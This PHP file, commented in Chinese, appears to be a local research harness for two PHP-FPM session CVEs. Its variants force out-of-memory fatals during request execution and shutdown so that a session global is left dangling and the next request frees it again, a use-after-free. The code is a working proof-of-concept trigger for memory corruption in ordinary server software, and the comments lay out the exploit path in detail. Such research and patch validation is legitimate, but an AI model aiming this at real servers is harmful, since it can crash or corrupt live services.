<?php
// prod.php — CVE-2026-109618 / CVE-2026-109619 生产者靶场页（仅用于本机授权实验）。
//
// 公告（GHSA-6wmf-4rv5-p3rp）给出的已验证 FPM 生产者形状：
//   startup 成功后进入执行阶段 -> 发布请求持有的全局状态 -> fatal（OOM）打断
//   匹配的 reset -> 请求堆释放后全局字段仍指向它 -> 下一请求消费（UAF）。
//
//   ?v=p1  变体 P1：session_start() 写 $_SESSION（状态发布）后 str_repeat
//          OOM fatal（执行阶段打断 reset —— 109619 经典 producer）。
//   ?v=p2  变体 P2：同 P1，但注册 register_shutdown_function：fatal 之后
//          shutdown 函数仍被调用，观察 OOM 后关闭阶段是否还能写状态
//          （109618 的 "shutdown 处理无效状态" 面之一）。
//   ?v=p3  变体 P3：$_SESSION 持 6MB 活串正常结束，OOM 落在 RSHUTDOWN 的
//          ps_write 序列化处 —— fatal 打断的是关闭阶段内部的 reset
//          （109618 "request shutdown 处理半初始化态" 的直接对应物）。
//
//   ?v=mk&sid= 建立真实会话并写 marker=m1（正常小写入，落盘基线）。
//   ?v=rd&sid= 回读：先输出 marker（小分配，必然可见），再输出 pad 长度。
//   p3 支持 &sid=：与 mk 同 sid 复用会话，使 OOM 前后可用 rd 对比
//          会话内容是否落盘 —— 8.4.26 encode 立即 bailout（被 flush 的
//          try 吞掉）=> s_write 不执行 => pad=0；8.4.27 delayed_oom
//          排队后分配继续成功 => 6MB 会话落盘 => pad=6291456
//          （shutdown 阶段绕过 memory_limit —— 109618 修复语义差异）。
//
//   ?v=p4  变体 P4：$_SESSION 内放一个 __destruct 会 OOM 的对象，脚本正常
//          结束。RSHUTDOWN 链：session flush（有 try）成功 -> 进
//          php_rshutdown_session_globals()（无保护）-> zval_ptr_dtor($_SESSION)
//          调 __destruct -> str_repeat 超 memory_limit -> 8.4.26 的
//          zend_mm_safe_error 双重 bailout 逃逸 per-module try ->
//          ZVAL_UNDEF 未执行：PS(http_session_vars) 悬挂指向即将整堆释放的
//          请求内存。FPM child 存活，下一请求 RINIT 侧 php_session_track_init
//          对悬挂 zval 再做 zval_ptr_dtor = UAF（CVE-2026-109619 生产者）。
//          session_abort() 保证 flush 不写盘（内容不可序列化），OOM 必然
//          精确落在 dtor 释放路径上。
//   ?v=p4a 控制组：同 p4 但对象析构不 OOM —— 验证 child 正常存活且无残留
//          （p4 若 child 异常退出则对照 p4a 区分"析构 OOM"与"析构本身"）。
//   ?v=p5  变体 P5：纯 64MB str_repeat 执行期 OOM 后进入 shutdown，观察
//          8.4.26 分配器 overflow 标志复位后 shutdown 内小分配仍可成功
//          —— 差异化 p4（p5 已知是 FPM 常规行为，作为 109618 的"执行期
//          OOM 不残留"边界对照，与 8.4.27 期望完全一致）。

$v = $_GET['v'] ?? '';

if ($v === 'p1' || $v === 'p2') {
    if ($v === 'p2') {
        register_shutdown_function(function () {
            // fatal 后仍会执行；尝试在 OOM 之后再触碰全局状态
            error_log("shutdown-fn-ran");
        });
    }
    session_start();
    $_SESSION['leak'] = str_repeat('A', 1024);   // 状态发布
    unset($_SESSION['leak']);
    $x = str_repeat('B', 64 * 1024 * 1024);      // 执行阶段 OOM fatal
    echo "unreachable: " . strlen($x) . "\n";
    exit;
}

if ($v === 'p3') {
    if (!empty($_GET['sid'])) {
        session_id($_GET['sid']);
    }
    session_start();
    // 4MB：执行期基线(~0.5M)+4M=4.5M < 8M 通过；RSHUTDOWN encode 需再
    // 造 ~4M 串 => 8.5M > 8M，OOM 精确落在 php_session_encode 分配点。
    // （6MB 时执行期 str_repeat 自身就超限，永远走不到 shutdown 编码。）
    $_SESSION['pad'] = str_repeat('A', 4 * 1024 * 1024);
    echo "published, dying at write\n";
    exit;   // 脚本正常结束 -> RSHUTDOWN -> php_session_flush -> ps_write
            // 序列化 4MB 再分配 -> 超 8M -> OOM 落在模块 RSHUTDOWN 途中
}

if ($v === 'mk') {
    if (!empty($_GET['sid'])) {
        session_id($_GET['sid']);
    }
    session_start();
    $_SESSION['marker'] = 'm1';
    echo "mk done\n";
    exit;
}

if ($v === 'rd') {
    // 回读判定页抬限：让 ps_read 反序列化 4MB 会话必然成功，输出确定
    // marker/pad —— pad>0 即证明 p3 的 OOM 场景下会话仍被完整写盘。
    ini_set('memory_limit', '64M');
    if (!empty($_GET['sid'])) {
        session_id($_GET['sid']);
    }
    session_start();
    $m = $_SESSION['marker'] ?? '(none)';
    $p = isset($_SESSION['pad']) ? strlen($_SESSION['pad']) : 0;
    echo "marker={$m} pad={$p}\n";
    exit;
}

if ($v === 'p4' || $v === 'p4a') {
    class Boom
    {
        public function __destruct()
        {
            // p4:  析构内分配超过 memory_limit(8M)。
            //      释放路径（zval_ptr_dtor，无 zend_try 保护）上触发
            //      zend_mm_safe_error -> bailout 逃逸 per-module try。
            // p4a: 控制组，仅写日志不分配，析构正常完成。
            if (($_GET['v'] ?? '') === 'p4') {
                $x = str_repeat('B', 64 * 1024 * 1024);
                echo "unreachable " . strlen($x) . "\n";
            } else {
                error_log("p4a-dtor-ran");
            }
        }
    }

    session_start();
    $_SESSION['boom'] = new Boom();
    // abort：丢弃会话不写盘（对象本就不可序列化），确保 RSHUTDOWN 里
    // flush 段（有 try）干净通过，bailout 只可能落在随后的
    // php_rshutdown_session_globals() 的 zval_ptr_dtor 上。
    session_abort();
    // 关键：unset 掉符号表里的 $_SESSION。否则 Boom 的析构会提前发生在
    // shutdown 步骤 2（zend_call_destructors，自带 try + mark_destructed），
    // OOM 被干净捕获、无残留（p4 前两轮实测证实）。unset 后唯一的引用
    // 只剩 PS(http_session_vars)，析构被推迟到 php_rshutdown_session_globals
    // 的 zval_ptr_dtor —— 该函数无 zend_try 保护，8.4.26 的 OOM bailout
    // 会从 ZVAL_UNDEF 之前逃逸（被模块级 try 捕获，child 存活）→ 残留。
    unset($_SESSION);
    echo "p4 published, dying in dtor\n";
    exit;   // 正常结束 -> 析构推迟到 session RSHUTDOWN 释放 PS 引用时
}

if ($v === 'p5') {
    $x = str_repeat('B', 64 * 1024 * 1024);   // 执行期 OOM，无 session 参与
    echo "unreachable: " . strlen($x) . "\n";
    exit;
}

echo "usage: ?v=p1|p2|p3|p4|p4a|p5\n";
